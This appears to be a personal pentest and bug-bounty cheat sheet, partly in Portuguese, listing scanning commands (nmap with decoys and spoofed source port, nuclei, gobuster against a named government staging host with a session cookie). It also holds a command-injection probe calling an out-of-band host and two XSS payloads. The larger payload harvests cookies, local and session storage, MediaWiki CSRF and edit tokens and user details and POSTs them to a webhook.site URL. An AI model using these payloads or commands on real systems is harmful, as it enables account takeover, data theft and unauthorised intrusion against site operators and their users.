"Vulnerability Disclosure Program" "VDP" site:uk -bughunt -hackerone -intigriti -bugcrowd -yeswehack

https://dorks.faisalahmed.me/


nmap -sU -p 53 --script=dns-nsid 10.129.2.48 -> ver~soa dns do servidor alvo pode ser vuln de exposição de dados sensiveis etc


subfinder -all -d alvo.com -recursive | httpx | nuclei -nmhe -t ./nuclei-templates/http/cves/2025/CVE-2025-0133.yaml


nmap 10.129.4.84 -sV -D RND:2 -Pn -sU -sS -g53 --max-retries 2 --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" -p-

nuclei -t cves/ -u http://alvo.com -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

extensão dotgit, wappalyzer, shodan, DNSlytics

nuclei -u https://cursos.rizomasur.org -tags moodle

`
<img src="x" onerror="fetch('https://webhook.site/de5d7883-a25c-41cd-beb6-113d2b50a605',{method:'POST',body:'cookie='+document.cookie})">
`

gobuster dir -u https://app.homolog.itamaraty.local/GestaoFinanceira/Pages/Dashboard/   -w /usr/share/wordlists/dirb/common.txt   -t 50   -H 'Host: app.homolog.itamaraty.local'   -H 'Cookie: ASP.NET_SessionId=whvgzv2plsyzvnglugu2kxyc; outro_cookie=valor'   -k -x html,php,js,aspx,bat,txt,zip

- ;(nslookup -q=cname hitvvbmacavlf462a1.bxss.me||curl hitvvbmacav  (passar em alguns headers)


- https://github.com/santoru/shcheck -> ver se tem alguns headers vulneraveis
- apt install zaproxy (uma boa tb pra scan web)

```bash

<img src="invalid" onerror="
  var data = {
    cookies: document.cookie,
    localStorage: {},
    sessionStorage: {},
    mediawikiTokens: {},
    userInfo: {}
  };

  // Capturar todos os dados do localStorage
  for(var i=0; i<localStorage.length; i++) {
    var key = localStorage.key(i);
    data.localStorage[key] = localStorage.getItem(key);
  }

  // Capturar todos os dados do sessionStorage
  for(var i=0; i<sessionStorage.length; i++) {
    var key = sessionStorage.key(i);
    data.sessionStorage[key] = sessionStorage.getItem(key);
  }

  // Tenta obter tokens do MediaWiki especificamente
  try {
    if (typeof mw !== 'undefined' && mw.user && mw.user.tokens) {
      data.mediawikiTokens = {
        editToken: mw.user.tokens.get('editToken'),
        csrfToken: mw.user.tokens.get('csrfToken'),
        watchToken: mw.user.tokens.get('watchToken')
      };
    }
  } catch(e) {}

  // Informações do usuário
  try {
    if (typeof mw !== 'undefined' && mw.config) {
      data.userInfo = {
        userName: mw.config.get('wgUserName'),
        userId: mw.config.get('wgUserId'),
        pageName: mw.config.get('wgPageName'),
        canonicalNamespace: mw.config.get('wgCanonicalNamespace'),
        revisionId: mw.config.get('wgRevisionId'),
        articleId: mw.config.get('wgArticleId')
      };
    }
  } catch(e) {}

  fetch('https://webhook.site/ce0ff999-b412-490d-aa38-f946520e63b0', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
">

```
